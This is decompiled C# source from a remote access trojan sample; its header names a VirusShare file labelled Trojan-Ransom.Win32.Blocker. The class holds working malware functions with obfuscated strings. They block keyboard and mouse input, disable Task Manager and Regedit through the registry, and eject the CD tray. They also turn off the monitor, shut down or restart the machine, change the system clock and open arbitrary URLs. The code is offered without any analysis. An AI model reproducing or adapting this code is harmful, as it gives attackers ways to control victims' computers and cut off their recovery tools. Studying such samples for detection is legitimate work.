// Decompiled with JetBrains decompiler
// Type: OpenSource_RAT_Schäding.FunFunktionen
// Assembly: Stub, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 8170AD08-ABA5-4012-BCC7-4CC67D0071A1
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare.00015-msil\Trojan-Ransom.Win32.Blocker.ikxa-53f746507d13e73a4ea2419189ad7b0070faaf51b1e13192df858b42ac6c25c0.exe

using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.Win32;
using System;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Threading;

namespace OpenSource_RAT_Schäding
{
  public class FunFunktionen
  {
    private const long API_FALSE = 0;
    private const long API_TRUE = 1;

    [DebuggerNonUserCode]
    public FunFunktionen()
    {
    }

    [DllImport("winmm.dll", CharSet = CharSet.Ansi, SetLastError = true)]
    private static extern long mciExecute([MarshalAs(UnmanagedType.VBByRefStr)] ref string lpstrcommand);

    [DllImport("user32.dll", EntryPoint = "SendMessageA")]
    private static extern void SendMessage(IntPtr hWnd, int uMsg, int wParam, int lParam);

    [DllImport("kernel32.dll", CharSet = CharSet.Ansi, SetLastError = true)]
    private static extern bool SetLocalTime(ref FunFunktionen.SYSTEMTIME time);

    private IntPtr Handle() => throw new NotImplementedException();

    [DllImport("user32", CharSet = CharSet.Ansi, SetLastError = true)]
    private static extern long BlockInput(long fBlock);

    public event FunFunktionen.ChatMSGEventHandler ChatMSG;

    public bool CD_Laufwerk_öffnen()
    {
      bool flag;
      try
      {
        string lpstrcommand = \u003F0\u003F.\u003F1\u003F("Fűɧ̲ђՔٮݻ\u0869॥\u0A64ପ౭൧\u0E68ུဥᅫታ፧ᑯ");
        FunFunktionen.mciExecute(ref lpstrcommand);
        flag = true;
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        flag = false;
        ProjectData.ClearProjectError();
      }
      return flag;
    }

    public object InputChatBox(string titel, string stext)
    {
      object obj;
      try
      {
        new Thread((ParameterizedThreadStart) (a0 => this.InputThread((string[]) a0)))
        {
          IsBackground = true
        }.Start((object) new string[2]{ stext, titel });
        obj = (object) true;
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        obj = (object) false;
        ProjectData.ClearProjectError();
      }
      return obj;
    }

    private void InputThread(string[] sText)
    {
      string str = Interaction.InputBox(sText[0], sText[1], \u003F0\u003F.\u003F1\u003F(""));
      if (Operators.CompareString(str, \u003F0\u003F.\u003F1\u003F(""), false) == 0)
        return;
      FunFunktionen.ChatMSGEventHandler chatMsgEvent = this.ChatMSGEvent;
      if (chatMsgEvent == null)
        return;
      chatMsgEvent(str);
    }

    public bool TastaturMaus_Bloeckieren()
    {
      bool flag;
      try
      {
        FunFunktionen.BlockInput(1L);
        flag = true;
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        flag = false;
        ProjectData.ClearProjectError();
      }
      return flag;
    }

    public object DisableTaskmanager(bool b)
    {
      object obj;
      try
      {
        if (b)
          Registry.CurrentUser.OpenSubKey(\u003F0\u003F.\u003F1\u003F("jŗɑ͂тՕفݗ\u086Dॽ\u0A46୍\u0C5Fൃ๘ཅ၏ᅜቻ\u1371ᑌᕊᙇᝍᡖᥓᩃ᭝ᱨᵮṩ\u1F7F\u2077Ⅼ≁⍳\u2467╧♺\u277D⡿⥌⩟⭡ⱡⵥ\u2E68⽣ぬㅻ\u325B㍕㑼㕷㙷㝧㡬"), true).SetValue(\u003F0\u003F.\u003F1\u003F("JŤɿͪѨե٭ݓ\u0867ॶ੯\u0B4E\u0C65\u0D73"), (object) \u003F0\u003F.\u003F1\u003F("0"), RegistryValueKind.DWord);
        else
          Registry.CurrentUser.OpenSubKey(\u003F0\u003F.\u003F1\u003F("jŗɑ͂тՕفݗ\u086Dॽ\u0A46୍\u0C5Fൃ๘ཅ၏ᅜቻ\u1371ᑌᕊᙇᝍᡖᥓᩃ᭝ᱨᵮṩ\u1F7F\u2077Ⅼ≁⍳\u2467╧♺\u277D⡿⥌⩟⭡ⱡⵥ\u2E68⽣ぬㅻ\u325B㍕㑼㕷㙷㝧㡬"), true).SetValue(\u003F0\u003F.\u003F1\u003F("JŤɿͪѨե٭ݓ\u0867ॶ੯\u0B4E\u0C65\u0D73"), (object) \u003F0\u003F.\u003F1\u003F("1"), RegistryValueKind.DWord);
        obj = (object) true;
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        obj = (object) false;
        ProjectData.ClearProjectError();
      }
      return obj;
    }

    public object DisableRegedit(bool b)
    {
      object obj;
      try
      {
        if (b)
          Registry.CurrentUser.OpenSubKey(\u003F0\u003F.\u003F1\u003F("jŗɑ͂тՕفݗ\u086Dॽ\u0A46୍\u0C5Fൃ๘ཅ၏ᅜቻ\u1371ᑌᕊᙇᝍᡖᥓᩃ᭝ᱨᵮṩ\u1F7F\u2077Ⅼ≁⍳\u2467╧♺\u277D⡿⥌⩟⭡ⱡⵥ\u2E68⽣ぬㅻ\u325B㍕㑼㕷㙷㝧㡬"), true).SetValue(\u003F0\u003F.\u003F1\u003F("PźɡͰѲգ٫ݟ\u0869६\u0A63\u0B7A\u0C7C\u0D75\u0E7Fདၫᅬቮ\u1372"), (object) \u003F0\u003F.\u003F1\u003F("0"), RegistryValueKind.DWord);
        else
          Registry.CurrentUser.OpenSubKey(\u003F0\u003F.\u003F1\u003F("jŗɑ͂тՕفݗ\u086Dॽ\u0A46୍\u0C5Fൃ๘ཅ၏ᅜቻ\u1371ᑌᕊᙇᝍᡖᥓᩃ᭝ᱨᵮṩ\u1F7F\u2077Ⅼ≁⍳\u2467╧♺\u277D⡿⥌⩟⭡ⱡⵥ\u2E68⽣ぬㅻ\u325B㍕㑼㕷㙷㝧㡬"), true).SetValue(\u003F0\u003F.\u003F1\u003F("PźɡͰѲգ٫ݟ\u0869६\u0A63\u0B7A\u0C7C\u0D75\u0E7Fདၫᅬቮ\u1372"), (object) \u003F0\u003F.\u003F1\u003F("1"), RegistryValueKind.DWord);
        obj = (object) true;
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        obj = (object) false;
        ProjectData.ClearProjectError();
      }
      return obj;
    }

    public bool TastaturMaus_Entblocken()
    {
      bool flag;
      try
      {
        FunFunktionen.BlockInput(0L);
        flag = true;
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        flag = false;
        ProjectData.ClearProjectError();
      }
      return flag;
    }

    public bool CD_Laufwerk_schließen()
    {
      bool flag;
      try
      {
        string lpstrcommand = \u003F0\u003F.\u003F1\u003F("Dųɡ̴ѐՖٰݥ\u086B१\u0A62ବ౯\u0D65\u0E66ེဧᅥቩ\u136Bᑰᕧᙥ");
        FunFunktionen.mciExecute(ref lpstrcommand);
        flag = true;
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        flag = false;
        ProjectData.ClearProjectError();
      }
      return flag;
    }

    public bool MonitorAusschalten()
    {
      bool flag;
      try
      {
        FunFunktionen.SendMessage(this.Handle(), 274, 61808, 2);
        flag = true;
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        flag = false;
        ProjectData.ClearProjectError();
      }
      return flag;
    }

    public bool MonitorEinschalten()
    {
      bool flag;
      try
      {
        FunFunktionen.SendMessage(this.Handle(), 274, 61808, -1);
        flag = true;
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        flag = false;
        ProjectData.ClearProjectError();
      }
      return flag;
    }

    public bool Runterfahren()
    {
      bool flag;
      try
      {
        Interaction.Shell(\u003F0\u003F.\u003F1\u003F("xŢɼͼѣթٲݪࠣयੲ"));
        flag = true;
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        flag = false;
        ProjectData.ClearProjectError();
      }
      return flag;
    }

    public bool NeuStarten()
    {
      bool flag;
      try
      {
        Interaction.Shell(\u003F0\u003F.\u003F1\u003F("yšɽͣѩղ٪ܣ\u082Fॳ"));
        flag = true;
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        flag = false;
        ProjectData.ClearProjectError();
      }
      return flag;
    }

    public bool Abmelden()
    {
      bool flag;
      try
      {
        Interaction.Shell(\u003F0\u003F.\u003F1\u003F("yšɽͣѩղ٪ܣ\u082F७"));
        flag = true;
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        flag = false;
        ProjectData.ClearProjectError();
      }
      return flag;
    }

    public bool WebseiteÖffnen(string Link)
    {
      bool flag;
      try
      {
        Process.Start(Link);
        flag = true;
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        flag = false;
        ProjectData.ClearProjectError();
      }
      return flag;
    }

    public bool SetTime(
      int Jahr,
      int Monat,
      int Tag,
      int Stunde,
      int Minute,
      int Sekunde,
      int Millisekunde,
      object DayofTheWeek)
    {
      bool flag;
      try
      {
        FunFunktionen.SetLocalTime(ref new FunFunktionen.SYSTEMTIME()
        {
          Day = checked ((short) Tag),
          DayOfWeek = Conversions.ToShort(DayofTheWeek),
          Hour = checked ((short) Stunde),
          Milliseconds = checked ((short) Millisekunde),
          Minute = checked ((short) Minute),
          Month = checked ((short) Monat),
          Second = checked ((short) Sekunde),
          Year = checked ((short) Jahr)
        });
        flag = true;
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        flag = false;
        ProjectData.ClearProjectError();
      }
      return flag;
    }

    private enum Params
    {
      TURN_MONITOR_ON = -1, // 0xFFFFFFFF
      TURN_MONITOR_OFF = 2,
      WM_SYSCOMMAND = 274, // 0x00000112
      SC_MONITORPOWER = 61808, // 0x0000F170
    }

    private struct SYSTEMTIME
    {
      public short Year;
      public short Month;
      public short DayOfWeek;
      public short Day;
      public short Hour;
      public short Minute;
      public short Second;
      public short Milliseconds;
    }

    public delegate void ChatMSGEventHandler(string sText);
  }
}
